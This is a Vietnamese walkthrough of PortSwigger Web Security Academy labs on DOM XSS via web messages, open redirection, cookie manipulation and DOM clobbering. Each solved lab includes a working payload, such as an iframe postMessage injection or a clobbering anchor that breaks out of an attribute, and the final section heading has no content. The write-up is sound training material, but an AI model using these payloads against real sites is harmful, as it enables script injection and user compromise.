# 1. DOM XSS using web messages
Nhận thấy trong source code có đoạn mã sau:

![image](https://user-images.githubusercontent.com/103978452/211499636-60830aeb-fd4d-4bcd-bae7-fbaf3f1a149a.png)
Đoạn code trên sẽ nhận web message và inject vào tag có id là 'ads'. Như vậy ta có thể cấu hình XSS sử dụng thẻ `<iframe>`

Vào exploit server, cấu hình đoạn code sau:

```
<iframe style="width: 500px; height: 500px;" src="https://0a1e00080340c863c0b7a49200dd0016.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>', '*')"></iframe>
```

Sau khi đoạn code trên được chạy, sẽ tạo 1 tag iframe. Tag iframe này sau đó sẽ gửi message đến target website, với nội dung `<img src=1 onerror=print()>`. Sau khi được inject vào thẻ có id=ads, lệnh print() sẽ được gọi.

Click "Deliver to victim", kết quả thành công.

# 2. DOM XSS using web messages and a JavaScript URL
Nhận thấy trong source code có đoạn script sau:

![image](https://user-images.githubusercontent.com/103978452/211507542-82ddefb4-5d22-42c8-abc7-f3769e961b4e.png)
Đoạn script trên sẽ bắt sự kiện message được gửi đến, kiểm tra xem trong data(url) nếu có chuỗi 'http:' hoặc 'https:' trong message content thì sẽ thiết lập `location.href=url`

Vào exploit, cấu hình đoạn code sau:
```
<iframe src="https://0a6100cd040bb11ec08677ae0042000b.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print(%22https:%22)', '*')"></iframe>
```

Đoạn code trên tạo một iframe, gửi message `javascript:print(%22https:%22)` tới target website. Như vậy khi target website bắt event 'message', lệnh `print('https')` sẽ được gọi

Sau khi click "Deliver to victim", bài lab được giải.

# 3. DOM XSS using web messages and JSON.parse
Trong source code có đoạn script sau:

![image](https://user-images.githubusercontent.com/103978452/211520513-92a0e9b0-3957-4279-be03-e3ee389d4364.png)
Nhận thấy dữ liệu hợp lệ cho "message" event là một JSON object. Nếu ta truyền một object có `type=load-channel` thì thuộc tính `url` của object đó sẽ được gắn cho một thẻ `iframe` mới.

Vào exploit server và cấu hình đoạn HTML sau:

```
<iframe src="https://0a7a00e903689c12c25c61e7002a00c8.web-security-academy.net/" onload="this.contentWindow.postMessage('{&quot;type&quot;:&quot;load-channel&quot;, &quot;url&quot;:&quot;javascript:print()&quot;}', '*')"></iframe>
```
Đoạn code trên sẽ gửi một message với content `{"type": "load-channel", "url": "javascript:print()"}`. Như vậy, khi thẻ `<iframe src="javascript:print()">` được tạo, lệnh print() sẽ được gọi.

Sau khi click "Deliver to victim", kết quả thành công.

# 4. DOM-based open redirection
Trong source code có đoạn thẻ `<a>` với sự kiện onclick như bên dưới:

```
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
```
Đoạn code trên sẽ redirect user tới giá trị của tham số `url`. Như vậy, ta có thể khiến user redirect đến exploit server bằng cách thiết lập URL sau:

```
https://0ad800f0032df10ac4cb4d1300dd004e.web-security-academy.net/post?postId=5&url=https://exploit-0a470076034cf181c4014c9201e80056.exploit-server.net/exploit
```

Nếu user click "Black to blog" thì website sẽ tự động chuyển hướng đến exploit server.

# 5. DOM-based cookie manipulation
Trong source code của `GET /product` có đoạn script sau:

![image](https://user-images.githubusercontent.com/103978452/211686424-cddbdabd-fafe-48f9-9fe0-b4125f062cb7.png)
Như vậy mỗi khi truy cập đến một product, biến window.location sẽ được đặt làm giá trị của cookie lastViewedProduct. 

Thử thay đổi cookie lastViewedProduct thành `'><script>alert(1)</script>`, ta thấy lệnh `alert(1)` được execute. Như vậy website có lỗ hổng XSS, ta có thể đóng attribute href của thẻ `<a>` và inject thẻ `<script>`.

Vào exploit server, cấu hình đoạn code sau:

```
<script>
document.location='https://0a01001f03664060c1505dad001d00ec.web-security-academy.net/product?productId=3&data=%27%3E%3Cscript%3Eprint()%3C/script%3E'
</script>
```

Đoạn code trên sẽ redirect victim tới trang product chứa lỗ hổng XSS, với payload được chèn vào là thẻ script gọi lệnh `print()`. Như vậy khi victim refresh lại trang hoặc truy cập một product khác, lệnh `print()` sẽ được gọi.

Sau khi click "Deliver exploit to victim", bài lab được giải thành công.

# 6. Exploiting DOM clobbering to enable XSS
Trong nội dung file `loadCommentsWithDomClobbering.js` có đoạn code sau:

![image](https://user-images.githubusercontent.com/103978452/211731470-ff72b23f-525a-4ade-ad8e-d2ed8866ad77.png)
Như vậy website sẽ kiểm tra `window.defaultAvatar` đã được định nghĩa hay chưa, nếu chưa thì sẽ sử dụng URL mặc định, còn nếu đã tồn tại thì sẽ sẽ dùng `window.defaultAvatar.avatar` để làm giá trị cho thuộc tính `src` của thẻ img.

Như vậy, ta có thể tấn công DOM clobbering bằng các bước sau:

1. Submit comment 1 với nội dung:

```
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="<giá trị muốn gán cho src>">
```
2. Submit tiếp comment 2 với nội dung bất kỳ. Khi javascript load ảnh avatar của comment 2, lúc này `window.defaultAvatar.avatar` sẽ trỏ đến thẻ `<a id=defaultAvatar name=avatar href="<giá trị muốn gán cho src>`. Khi thực hiện gán `'<img src="' + defaultAvatar.avatar + '">'` thì nội dung thuộc tính src sẽ tương ứng với `<giá trị muốn gán cho src>.toString()`

Tuy nhiên, ta không thể thực thi javascript trong thuộc tính src của tag img. Như vậy ta cần tìm cách escape double quotes ("). Hàm `toString()` sẽ tự động URLencode các ký tự đặc biệt nếu giá trị thuộc tính `href` có protocol là http, nếu ta không dùng http thì sẽ có thể escape, nhưng website đã chặn các protocol khác. (Thử với href='x:abc' thì không thành công).

Thử với `href='http://x:"'` thì thấy double quotes không bị URL encode, như vậy website chỉ kiểm tra http: có đứng ở đầu string hay không. Như vậy, ta có thể dễ dàng bypass.

Các bước exploit như sau:

1. Submit một comment 1 với nội dung:
```
<a id=defaultAvatar>
<a id=defaultAvatar name=avatar href='http://x:"onerror="alert(1)"x="'>
```

2. Tiếp tục submit comment 2 với nội dung bất kỳ. Sau khi refresh lại trang, image của comment này sẽ trở thành:

![image](https://user-images.githubusercontent.com/103978452/211732261-e1f38fcb-d0c5-45e3-8fe2-71bbf23e0f4d.png)

Lệnh `alert(1)` được thực thi và bài lab được giải. 

# 7. Clobbering DOM attributes to bypass HTML filters

